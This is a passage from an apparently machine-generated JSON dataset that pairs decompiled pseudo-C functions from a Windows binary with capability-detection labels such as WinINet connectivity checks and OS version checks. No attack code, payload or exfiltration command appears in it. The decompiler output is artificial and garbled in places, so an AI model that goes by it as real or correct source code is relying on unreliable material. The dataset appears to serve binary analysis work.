0;\ncode_r0x0003daff:\n    if (*(arg1 + 0x6b0) != 0) {\n        (*_fcn.00011638)(arg1 + 0x698, 0, 0);\n    }\n    fcn.00031598(arg1 + 0x680, auStackX8, 1);\n    if (arg1_00 != NULL) {\n        if (arg3 < uVar7) {\n            uVar7 = arg3;\n        }\n        *arg4 = uVar7;\n        puVar8 = arg1_00;\n        uVar9 = 0;\n        do {\n            if (*arg4 <= uVar9) break;\n            fcn.000619f6(uVar9 + arg2, puVar8[3], puVar8[2]);\n            uVar9 = uVar9 + puVar8[2];\n            puVar8 = *puVar8;\n        } while (puVar8 != NULL);\n        do {\n            puVar8 = *arg1_00;\n            fcn.0002fc50(arg1_00[3]);\n            fcn.0002fc50(arg1_00);\n            arg1_00 = puVar8;\n        } while (puVar8 != NULL);\n        (**0x7b100)(*0x7b4d0, 0, 0, *(arg1 + 0x678), *(arg1 + 0x670), 0x14, 0x10000, 0, 0, 0x3d214, 0);\n        uVar1 = *(arg1 + 0x670);\n        uVar2 = *(arg1 + 0x678);\n        puStackX32 = NULL;\n        iVar3 = (**0x7b110)(*0x7b4d8, 0, 0, 0, 0, 0, &puStackX32);\n        if (iVar3 == 0) {\n            iVar3 = (**0x7b100)(*0x7b4d0, 0, 0, uVar2, uVar1, 0x14, 3, puStackX32, 0, 0x3d214, 0);\n            puStackX32 = -(iVar3 != 0) & puStackX32;\n        }\n        if (puStackX32 != NULL) {\n            (**0x7b108)();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1463
    },
    "0003dca4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003dca4(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    ulong uVar3;\n    char *pcVar4;\n    ushort in_R9W;\n    int32_t in_stack_00000028;\n    ulong in_stack_00000030;\n    int64_t iStack104;\n    ushort uStack96;\n    ushort uStack94;\n    ushort uStack90;\n    ushort uStack88;\n    ushort uStack86;\n    ushort uStack84;\n    ushort uStack82;\n    \n    cVar1 = fcn.00049024(1);\n    if (cVar1 != '\\0') {\n        iStack104 = *0xfffff78000000014 - *0x7b580;\n        fcn.00030a80(&iStack104, &uStack96);\n        uVar3 = 0x1569c;\n        if (in_stack_00000028 != 0) {\n            uVar3 = 0x156a0;\n        }\n        fcn.00061b1c(0x7b590, 0x7f, 0x15650, uStack96, uStack94, uStack90, uStack88, uStack86, uStack84, uStack82, uVar3\n                     , arg3 >> 0x18, arg3 >> 0x10 & 0xff, arg3 >> 8 & 0xff, arg3 & 0xff, in_R9W, arg1 >> 0x18, \n                     arg1 >> 0x10 & 0xff, arg1 >> 8 & 0xff, arg1 & 0xff, noname_1, in_stack_00000030);\n        *0x7b60f = 0;\n        uVar2 = 0xffffffffffffffff;\n        pcVar4 = 0x7b590;\n        do {\n            if (uVar2 == 0) break;\n            uVar2 = uVar2 - 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        fcn.00049b14(1, 0x7b590, ~uVar2 - 1);\n    }\n    return;\n}\n",
        "token_count": 516
    },
    "0003de70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003de70(ulong arg1, ulong arg2)\n\n{\n    ulong in_R8;\n    \n    fcn.0003dca4(arg1, arg2, in_R8);\n    return;\n}\n",
        "token_count": 49
    },
    "0003de98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003de98(ulong param_1, ulong param_2, ulong param_3)\n\n{\n    fcn.0003dca4(param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 51
    },
    "0003dee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003dee8(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    \n    iVar5 = *(arg1 + 0x28);\n    iVar1 = *(arg1 + 0x68);\n    iVar6 = *(arg1 + 0x48);\n    iVar7 = *(arg1 + 0x58);\n    uVar4 = 0;\n    iVar3 = iVar5 + 0x1c;\n    if (iVar1 != 0) {\n        do {\n            iVar2 = fcn.0003d194(*(iVar5 + 4), *(iVar5 + 2), *(iVar3 + 4));\n            if (iVar2 == 0) {\n                iVar2 = fcn.00031dd0();\n                if (iVar2 != 0) goto code_r0x0003df54;\n                iVar5 = iVar5 + *(arg1 + 0x30);\n                iVar3 = iVar3 + *(arg1 + 0x30);\n                iVar6 = iVar6 + *(arg1 + 0x50);\n                iVar7 = iVar7 + *(arg1 + 0x60);\n                uVar4 = uVar4 + 1;\n            }\n            else {\ncode_r0x0003df54:\n                if (*(arg1 + 0x48) != 0) {\n                    fcn.000619f6(iVar6, *(arg1 + 0x50) + iVar6, ((*(arg1 + 0x68) - uVar4) + -1) * *(arg1 + 0x50));\n                }\n                if (*(arg1 + 0x58) != 0) {\n                    fcn.000619f6(iVar7, *(arg1 + 0x60) + iVar7, ((*(arg1 + 0x68) - uVar4) + -1) * *(arg1 + 0x60));\n                }\n                fcn.000619f6();\n                *(arg1 + 0x68) = *(arg1 + 0x68) + -1;\n            }\n        } while (uVar4 < *(arg1 + 0x68));\n    }\n    fcn.00061a56(*(arg1 + 0x30) * *(arg1 + 0x68) + *(arg1 + 0x28), 0, (iVar1 - *(arg1 + 0x68)) * *(arg1 + 0x30));\n    fcn.00061a56(*(arg1 + 0x50) * *(arg1 + 0x68) + *(arg1 + 0x48), 0, (iVar1 - *(arg1 + 0x68)) * *(arg1 + 0x50));\n    // WARNING: Could not recover jumptable at 0x00061a56. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11160)(*(arg1 + 0x60) * *(arg1 + 0x68) + *(arg1 + 0x58), 0, (iVar1 - *(arg1 + 0x68)) * *(arg1 + 0x60));\n    return;\n}\n",
        "token_count": 740
    },
    "0003eab8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003eab8(ulong *arg1, int64_t arg2, uint64_t arg3, uint64_t *arg4)\n\n{\n    int32_t iVar1;\n    ulong *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t uStackX8;\n    int32_t in_stack_00000028;\n    \n    uVar3 = arg1[4];\n    if (uVar3 == 0) {\n        if (arg3 < 0xbb9) {\n            iVar1 = fcn.00045e80(*arg1, arg1[1], arg1 + 5, 3000);\n            if ((iVar1 != 0) || (uStackX8 == 0)) {\n                return 0;\n            }\n            arg1[4] = uStackX8;\n            arg1[3] = 0;\n            if (uStackX8 < arg3) {\n                arg3 = uStackX8;\n            }\n            arg1[2] = uStackX8 % 3000;\n            *arg4 = arg3;\n            fcn.000619f6(arg2, arg1 + 5, arg3);\n            if (in_stack_00000028 == 0) {\n                arg1[3] = *arg4 % 3000;\n                arg1[4] = arg1[4] - *arg4;\n            }\n        }\n        else {\n            if (in_stack_00000028 != 0) {\n                return 0;\n            }\n            iVar1 = fcn.00045e80(*arg1, arg1[1], arg2, arg3);\n            if (iVar1 != 0) {\n                return 0;\n            }\n            if (*arg4 == 0) {\n                return 0;\n            }\n        }\n    }\n    else {\n        if (uVar3 < arg3) {\n            arg3 = uVar3;\n        }\n        uVar3 = arg1[3];\n        puVar2 = uVar3 + 0x28 + arg1;\n        uVar4 = arg3;\n        if ((arg1[2] <= uVar3) && (uVar3 = 3000 - uVar3,  uVar3 <= arg3)) {\n            fcn.000619f6(arg2, puVar2, uVar3);\n            puVar2 = arg1 + 5;\n            arg2 = uVar3 + arg2;\n            uVar4 = arg3 - uVar3;\n        }\n        fcn.000619f6(arg2, puVar2, uVar4);\n        if (in_stack_00000028 == 0) {\n            arg1[4] = arg1[4] - arg3;\n            arg1[3] = (arg3 + arg1[3]) % 3000;\n        }\n        *arg4 = arg3;\n    }\n    return 1;\n}\n",
        "token_count": 642
    },
    "0003ec74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003ec74(ulong *arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    ulong arg1_00;\n    ulong arg2;\n    ulong *arg3;\n    int64_t arg4;\n    int64_t iStackX8;\n    \n    arg4 = 3000;\n    if (arg1[4] != 3000) {\n        if (arg1[4] == 0) {\n            arg2 = arg1[1];\n            arg1[4] = 0;\n            arg1[2] = 0;\n            arg1[3] = 0;\n            arg3 = arg1 + 5;\n            arg1_00 = *arg1;\n        }\n        else {\n            uVar1 = arg1[2];\n            arg2 = arg1[1];\n            arg3 = uVar1 + 0x28 + arg1;\n            if (arg1[3] < uVar1) {\n                arg4 = 3000 - uVar1;\n            }\n            else {\n                arg4 = arg1[3] - uVar1;\n            }\n            arg1_00 = *arg1;\n        }\n        iVar2 = fcn.00045e80(arg1_00, arg2, arg3, arg4);\n        if ((iVar2 == 0) && (iStackX8 != 0)) {\n            arg1[4] = arg1[4] + iStackX8;\n            arg1[2] = (iStackX8 + arg1[2]) % 3000;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 360
    },
    "0003ed40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003ed40(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    char *pcVar5;\n    ulong arg4_00;\n    int64_t *in_stack_00000028;\n    int64_t aiStack408 [2];\n    uchar **ppuStack392;\n    char *pcStack384;\n    int32_t iStack376;\n    uchar *puStack368;\n    ulong uStack360;\n    uint uStack352;\n    uchar auStack344 [8];\n    ulong uStack336;\n    uint uStack328;\n    char acStack312 [128];\n    char acStack184 [128];\n    \n    uVar4 = 0;\n    aiStack408[0] = 0;\n    fcn.000286a0(acStack312, 0x80);\n    iVar3 = -1;\n    pcVar5 = acStack312;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.0005fa98(aiStack408, 0x661e0, 0, 0);\n    if (iVar2 == 0) {\n        iVar2 = fcn.000600ac(aiStack408[0], 0);\n        if (iVar2 == 0) {\n            arg4_00 = 0x11b75;\n            if (arg4 != 0) {\n                arg4_00 = 0x157c4;\n            }\n            fcn.0001fd08(acStack184, 0x80, 0x157bc, arg4_00);\n            fcn.00061a56(&ppuStack392, 0);\n            pcStack384 = acStack184;\n            iVar3 = -1;\n            pcVar5 = acStack184;\n            do {\n                if (iVar3 == 0) break;\n                iVar3 = iVar3 + -1;\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            ppuStack392 = &puStack368;\n            puStack368 = auStack344;\n            iStack376 = ~iVar3 - 1;\n            uStack336 = 0x11b75;\n            uStack328 = 1;\n            uStack360 = arg1;\n            uStack352 = arg2;\n            iVar2 = fcn.0006052c(aiStack408[0], &ppuStack392, 0);\n            iVar3 = aiStack408[0];\n            if (iVar2 == 0) {\n                if (in_stack_00000028 != NULL) {\n                    aiStack408[0] = 0;\n                    *in_stack_00000028 = iVar3;\n                }\n                uVar4 = 1;\n            }\n        }\n    }\n    if (aiStack408[0] != 0) {\n        fcn.0005fd0c(aiStack408, 0);\n    }\n    return uVar4;\n}\n",
        "token_count": 714
    },
    "0003f7b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003f7b0(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    ulong uStackX8;\n    uint32_t uStackX16;\n    ulong uStack1704;\n    ulong uStack1696;\n    ulong uStack1688;\n    ulong uStack1680;\n    int64_t iStack1672;\n    uchar auStack1656 [128];\n    uchar auStack1528 [1512];\n    \n    iVar3 = -1;\n    pcVar4 = 0x7b620;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    uStack1704 = 0;\n    uStack1696 = 0;\n    iStack1672 = 0;\n    iVar2 = fcn.0005fa98(&uStackX8, 0x661f0, 0, 0);\n    if (iVar2 == 0) {\n        fcn.00061a56(auStack1656, 0, 0x80);\n        fcn.0001fd08(auStack1656, 0x7f, 0x158c0, *(arg1 + 0x38));\n        iVar2 = fcn.00060190(uStackX8, auStack1656, 0);\n        if ((iVar2 == 0) && (iVar2 = fcn.000600ac(uStackX8, 0),  iVar2 == 0)) {\n            uStack1688 = uStackX8;\n            uStack1680 = *(arg1 + 0x20);\n            iStack1672 = *(arg1 + 0x28);\n            iVar2 = fcn.0001a650(&uStack1704, 0x3f72c, &uStack1688);\n            if (iVar2 == 0) {\n                if (*(arg1 + 0x634) == 0) goto code_r0x0003f929;\n                iVar2 = fcn.00060208(uStackX8, arg1 + 0x58, *(arg1 + 0x634), 0);\n                while (iVar2 == 0) {\ncode_r0x0003f929:\n                    iVar2 = fcn.00045e80(*(arg1 + 0x20), *(arg1 + 0x28), auStack1528, 0x5dc);\n                    if (iVar2 != 0) break;\n                    iVar2 = fcn.00060208(uStackX8, auStack1528, uStackX16, 0);\n                }\n            }\n        }\n    }\n    fcn.0005fd0c(&uStackX8, 0);\n    iVar2 = fcn.0002eec4(&uStack1704);\n    if (iVar2 == 0) {\n        if (iStack1672 != 0) {\n            fcn.00045f8c(*(arg1 + 0x20), *(arg1 + 0x28));\n        }\n    }\n    else {\n        fcn.00031648(&uStack1704, 0);\n        fcn.00031624(&uStack1704);\n    }\n    fcn.00045f64(arg1);\n    return 0;\n}\n",
        "token_count": 765
    },
    "0003fcec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003fcec(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint32_t auStackX8 [2];\n    ulong auStackX16 [3];\n    ulong uStack360;\n    ulong uStack352;\n    ulong uStack344;\n    ulong uStack336;\n    int64_t iStack328;\n    char acStack320 [40];\n    char acStack280 [128];\n    uchar auStack152 [128];\n    \n    uStack360 = 0;\n    uStack352 = 0;\n    iStack328 = 0;\n    fcn.00028648(acStack280, 0x73);\n    iVar2 = *(arg1 + 0x30);\n    if (iVar2 != 1) {\n        fcn.00061a56(acStack320, 0, 0x21);\n        fcn.0001fd08(acStack320, 0x20, 0x15920, iVar2 - 1);\n        iVar3 = -1;\n        pcVar5 = acStack280;\n        do {\n            pcVar4 = pcVar5;\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            pcVar4 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar4;\n        } while (cVar1 != '\\0');\n        iVar3 = 0;\n        do {\n            cVar1 = acStack320[iVar3];\n            pcVar4[iVar3 + -1] = cVar1;\n            iVar3 = iVar3 + 1;\n        } while (cVar1 != '\\0');\n    }\n    iVar3 = -1;\n    pcVar5 = acStack280;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.0005fa98(auStackX16, 0x66208, 0, 0);\n    if (iVar2 == 0) {\n        fcn.00061a56(auStack152, 0, 0x80);\n        fcn.0001fd08(auStack152, 0x7f, 0x158e8, *(arg1 + 0x38));\n        iVar2 = fcn.00060190(auStackX16[0], auStack152, 0);\n        if ((iVar2 == 0) && (iVar2 = fcn.000600ac(auStackX16[0], 0),  iVar2 == 0)) {\n            uStack344 = auStackX16[0];\n            uStack336 = *(arg1 + 0x20);\n            iStack328 = *(arg1 + 0x28);\n            iVar2 = fcn.0001a650(&uStack360, 0x3fbb4, &uStack344);\n            if (iVar2 == 0) {\n                if (*(arg1 + 0x34) == 0) goto code_r0x0003ff54;\n                iVar3 = fcn.0002fbc4(*(arg1 + 0x34));\n                if (iVar3 != 0) {\n                    iVar2 = fcn.0003fc74(*(arg1 + 0x20), *(arg1 + 0x28), iVar3, *(arg1 + 0x34));\n                    while (fcn.0002fc50(iVar3),  iVar2 == 0) {\ncode_r0x0003ff54:\n                        iVar2 = fcn.0003fc74(*(arg1 + 0x20), *(arg1 + 0x28), auStackX8, 4);\n                        if (iVar2 != 0) break;\n                        auStackX8[0] = fcn.0002fcf4(auStackX8[0]);\n                        iVar3 = fcn.0002fbc4(auStackX8[0]);\n                        if (iVar3 == 0) break;\n                        iVar2 = fcn.0003fc74(*(arg1 + 0x20), *(arg1 + 0x28), iVar3, auStackX8[0]);\n                        if (iVar2 != 0) {\n                            fcn.0002fc50(iVar3);\n                            break;\n                        }\n                        iVar2 = fcn.00060208(auStackX16[0], iVar3, auStackX8[0], 0);\n                    }\n                }\n            }\n        }\n    }\n    fcn.0005fd0c(auStackX16, 0);\n    iVar2 = fcn.0002eec4(&uStack360);\n    if (iVar2 == 0) {\n        if (iStack328 != 0) {\n            fcn.00045f8c(*(arg1 + 0x20), *(arg1 + 0x28));\n        }\n    }\n    else {\n        fcn.00031648(&uStack360, 0);\n        fcn.00031624(&uStack360);\n    }\n    fcn.00045f64(arg1);\n    return 0;\n}\n",
        "token_count": 1173
    },
    "000408f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.000408f8(ulong noname_0, ulong noname_1, ulong noname_2, uint *arg4)\n\n{\n    int64_t *piVar1;\n    int16_t iVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint64_t uVar6;\n    int64_t arg1;\n    ulong uVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    int64_t iVar10;\n    int32_t *piVar11;\n    uint32_t uVar12;\n    int64_t iVar13;\n    int32_t *piVar14;\n    int16_t *piVar15;\n    int16_t *piVar16;\n    uchar *puVar17;\n    uint32_t uVar18;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    uint32_t auStack168 [2];\n    uint *puStack160;\n    uint32_t uStack152;\n    int64_t iStack144;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    \n    arg1 = 0;\n    *arg4 = 3;\n    fcn.00061a56(auStack168, 0, 0x20);\n    puStack160 = &uStack136;\n    auStack168[0] = 9;\n    fcn.00061a56(&uStack136, 0, 0x48);\n    uStack124 = 4;\n    uStack116 = 4;\n    uStack108 = 4;\n    uStack100 = 4;\n    iVar13 = 0x40;\n    uStack136 = 0x27;\n    uStack132 = 2;\n    uStack128 = 0x3b;\n    uStack120 = 0x3d;\n    uStack112 = 0x3c;\n    uStack104 = 0x3e;\n    uStack96 = 0x3f;\n    uStack92 = 1;\n    uStack88 = 0x40;\n    uStack84 = 1;\n    uStack80 = 0x41;\n    uStack76 = 2;\n    uStack72 = 0x42;\n    uStack68 = 2;\n    uVar3 = (**0x113d0)(0x888a0);\n    piVar11 = 0x87cb8;\n    uVar6 = 0;\n    iVar9 = iVar13;\n    do {\n        if (*piVar11 != 0) {\n            uVar6 = uVar6 + 1;\n        }\n        piVar11 = piVar11 + 0xc;\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    if (uVar6 == 0) {\n        uVar5 = 0;\ncode_r0x00040a15:\n        (**0x113c0)(0x888a0, piVar11 & 0xffffffffffffff00 | uVar3);\n    }\n    else {\n        arg1 = fcn.0002fbf0(uVar6 * 0x30);\n        if (arg1 == 0) {\n            uVar5 = 0x21590004;\n            goto code_r0x00040a15;\n        }\n        uVar6 = 0;\n        piVar14 = 0x87ca0;\n        iVar9 = arg1;\n        do {\n            if (piVar14[6] != 0) {\n                piVar11 = piVar14;\n                fcn.000619f6(iVar9, piVar14, 0x30);\n                uVar6 = uVar6 + 1;\n                iVar9 = iVar9 + 0x30;\n            }\n            piVar14 = piVar14 + 0xc;\n            iVar13 = iVar13 + -1;\n        } while (iVar13 != 0);\n        (**0x113c0)(0x888a0, piVar11 & 0xffffffffffffff00 | uVar3);\n        uVar12 = uVar6;\n        uStack152 = uVar12;\n        iStack144 = fcn.0002fc18(uVar6);\n        if (iStack144 == 0) {\n            uVar5 = 0x21590004;\n            goto code_r0x00040e59;\n        }\n        uVar18 = 0;\n        if (uVar12 != 0) {\n            iVar9 = 0;\n            puVar17 = arg1 + 3;\n            do {\n                uVar7 = fcn.0002fbc4(auStack168[0] * 0x18 + 0x88);\n                *(iVar9 + iStack144) = uVar7;\n                if (*(iVar9 + iStack144) == 0) {\n                    uVar5 = 0x21590004;\n                    goto code_r0x00040e2c;\n                }\n                fcn.00061a56(*(iVar9 + iStack144), 0, auStack168[0] * 0x18);\n                iVar13 = *(iVar9 + iStack144);\n                piVar16 = iVar13 + auStack168[0] * 0x18;\n                *(iVar13 + 8) = iVar13 + 0x10;\n                **(iVar9 + iStack144) = 4;\n                **(*(iVar9 + iStack144) + 8) = *(puVar17 + 0x15);\n                fcn.00061a62(piVar16, 0x15aa0, puVar17[-3], puVar17[-2], puVar17[-1], *puVar17);\n                *(*(iVar9 + iStack144) + 0x20) = piVar16;\n                iVar13 = -1;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x18) = ~iVar13 * 2;\n                iVar13 = -1;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                uVar4 = puVar17[6];\n                piVar16 = piVar16 + ~iVar13;\n                uVar8 = puVar17[5];\n                fcn.00061a62(piVar16, 0x14908, puVar17[1], puVar17[2], puVar17[3], puVar17[4], uVar8, uVar4);\n                *(*(iVar9 + iStack144) + 0x38) = piVar16;\n                iVar13 = -1;\n                iVar10 = iVar13;\n                piVar15 = piVar16;\n                do {\n                    if (iVar10 == 0) break;\n                    iVar10 = iVar10 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x30) = ~iVar10 * 2;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                piVar16 = piVar16 + ~iVar13;\n                fcn.00061a62(piVar16, 0x15aa0, puVar17[9], puVar17[10], puVar17[0xb], puVar17[0xc], uVar8, uVar4);\n                *(*(iVar9 + iStack144) + 0x50) = piVar16;\n                iVar13 = -1;\n                iVar10 = iVar13;\n                piVar15 = piVar16;\n                do {\n                    if (iVar10 == 0) break;\n                    iVar10 = iVar10 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x48) = ~iVar10 * 2;\n                piVar15 = piVar16;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar15;\n                    piVar15 = piVar15 + 1;\n                } while (iVar2 != 0);\n                piVar16 = piVar16 + ~iVar13;\n                fcn.00061a62(piVar16, 0x14908, puVar17[0xd], puVar17[0xe], puVar17[0xf], puVar17[0x10], puVar17[0x11], \n                             puVar17[0x12]);\n                *(*(iVar9 + iStack144) + 0x68) = piVar16;\n                iVar13 = -1;\n                do {\n                    if (iVar13 == 0) break;\n                    iVar13 = iVar13 + -1;\n                    iVar2 = *piVar16;\n                    piVar16 = piVar16 + 1;\n                } while (iVar2 != 0);\n                *(*(iVar9 + iStack144) + 0x60) = ~iVar13 * 2;\n                *(*(iVar9 + iStack144) + 0x80) = *(iVar9 + iStack144) + 0x88;\n                *(*(iVar9 + iStack144) + 0x78) = 1;\n                **(*(iVar9 + iStack144) + 0x80) = puVar17[0x1a] != '\\0';\n                *(*(iVar9 + iStack144) + 0x98) = *(iVar9 + iStack144) + 0xa0;\n                *(*(iVar9 + iStack144) + 0x90) = 1;\n                **(*(iVar9 + iStack144) + 0x98) = puVar17[0x19] != '\\0';\n                uVar18 = uVar18 + 1;\n                *(*(iVar9 + iStack144) + 0xb0) = *(iVar9 + iStack144) + 0xb8;\n                *(*(iVar9 + iStack144) + 0xa8) = 4;\n                **(*(iVar9 + iStack144) + 0xb0) = *(puVar17 + 0x25);\n                *(*(iVar9 + iStack144) + 200) = *(iVar9 + iStack144) + 0xd0;\n                *(*(iVar9 + iStack144) + 0xc0) = 4;\n                piVar1 = iVar9 + iStack144;\n                iVar9 = iVar9 + 8;\n                **(*piVar1 + 200) = *(puVar17 + 0x29);\n                puVar17 = puVar17 + 0x30;\n            } while (uVar18 < uVar12);\n        }\n        uVar5 = fcn.0002ae80(auStack168, in_stack_00000028, in_stack_00000030);\n    }\ncode_r0x00040e2c:\n    if ((iStack144 != 0) && (uVar12 = 0,  uStack152 != 0)) {\n        iVar9 = 0;\n        do {\n            fcn.0002fc50(*(iStack144 + iVar9));\n            uVar12 = uVar12 + 1;\n            iVar9 = iVar9 + 8;\n        } while (uVar12 < uStack152);\n    }\ncode_r0x00040e59:\n    fcn.0002fc50(iStack144);\n    if (arg1 != 0) {\n        fcn.0002fc50(arg1);\n    }\n    return uVar5;\n}\n",
        "token_count": 2788
    },
    "00041014": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00041014(int64_t arg1, ulong *arg2, ulong arg3, uint64_t arg4)\n\n{\n    ulong *arg1_00;\n    int64_t **ppiVar1;\n    int32_t aiStackX32 [2];\n    int64_t iStack72;\n    int64_t **appiStack64 [2];\n    \n    arg4 = arg4 & 0xffffffff;\n    appiStack64[0] = NULL;\n    iStack72 = 0;\n    arg1_00 = fcn.0002fbf0(arg4 + 0xe);\n    if (arg1_00 == NULL) {\n        aiStackX32[0] = -0x3fffff66;\n    }\n    else {\n        *arg1_00 = *arg2;\n        *(arg1_00 + 1) = *(arg2 + 1);\n        *(arg1_00 + 0xc) = *(arg2 + 0xc);\n        fcn.000619f6(arg1_00 + 0xe, arg3, arg4);\n        (**0x11040)(aiStackX32, appiStack64, *0x7b898, arg1_00, arg4 + 0xe);\n        if ((aiStackX32[0] == 0) && ((**0x110a8)(aiStackX32, &iStack72, *0x7b8a0),  aiStackX32[0] == 0)) {\n            *(iStack72 + 0x60) = 0x70724152;\n            fcn.0002ed80(iStack72 + 0x68);\n            for (ppiVar1 = appiStack64[0]; *ppiVar1 != NULL; ppiVar1 = *ppiVar1) {\n            }\n            if (*(iStack72 + 8) == 0) {\n                *(iStack72 + 0x10) = ppiVar1;\n            }\n            *ppiVar1 = *(iStack72 + 8);\n            *(iStack72 + 8) = appiStack64[0];\n            *(iStack72 + 0x28) = 0;\n            aiStackX32[0] = (**(arg1 + 0x60))(*(arg1 + 8), iStack72);\n            if (aiStackX32[0] == 0x103) {\n                arg1_00 = NULL;\n                iStack72 = 0;\n                